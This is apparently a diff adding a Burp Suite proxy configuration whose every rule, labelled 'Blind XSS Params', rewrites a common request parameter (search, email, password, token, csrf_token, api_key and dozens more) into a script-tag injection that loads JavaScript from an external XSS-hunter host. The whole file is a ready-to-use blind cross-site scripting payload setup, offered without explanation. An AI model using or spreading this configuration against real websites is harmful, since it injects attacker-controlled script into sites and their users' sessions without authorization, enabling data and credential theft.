@@ -1,0 +1,302 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^q.*$",
+                "string_replace": "q=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^s.*$",
+                "string_replace": "s=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^search.*$",
+                "string_replace": "search=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^lang.*$",
+                "string_replace": "lang=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^keyword.*$",
+                "string_replace": "keyword=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^query.*$",
+                "string_replace": "query=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^page.*$",
+                "string_replace": "page=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^keywords.*$",
+                "string_replace": "keywords=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^year.*$",
+                "string_replace": "year=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^view.*$",
+                "string_replace": "view=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^email.*$",
+                "string_replace": "email=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^type.*$",
+                "string_replace": "type=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^name.*$",
+                "string_replace": "name=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^p.*$",
+                "string_replace": "p=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^callback.*$",
+                "string_replace": "callback=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^jsonp.*$",
+                "string_replace": "jsonp=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^api_key.*$",
+                "string_replace": "api_key=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^api.*$",
+                "string_replace": "api=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^password.*$",
+                "string_replace": "password=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^email.*$",
+                "string_replace": "email=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^emailto.*$",
+                "string_replace": "emailto=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^token.*$",
+                "string_replace": "token=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^username.*$",
+                "string_replace": "username=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^csrf_token.*$",
+                "string_replace": "csrf_token=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^unsubscribe_token.*$",
+                "string_replace": "unsubscribe_token=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^id.*$",
+                "string_replace": "id=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^item.*$",
+                "string_replace": "item=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^page_id.*$",
+                "string_replace": "page_id=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^month.*$",
+                "string_replace": "month=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^immagine.*$",
+                "string_replace": "immagine=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^list_type.*$",
+                "string_replace": "list_type=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^url.*$",
+                "string_replace": "url=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^terms.*$",
+                "string_replace": "terms=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^categoryid.*$",
+                "string_replace": "categoryid=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^key.*$",
+                "string_replace": "key=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^l.*$",
+                "string_replace": "l=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            },
+            {
+                "comment": "Blind XSS Params",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_param_name",
+                "string_match": "^begindate.*$",
+                "string_replace": "begindate=\"><script src=https://adrekleson.xss.ht></script>&tmp"
+            }
+        ]
+    }
+}
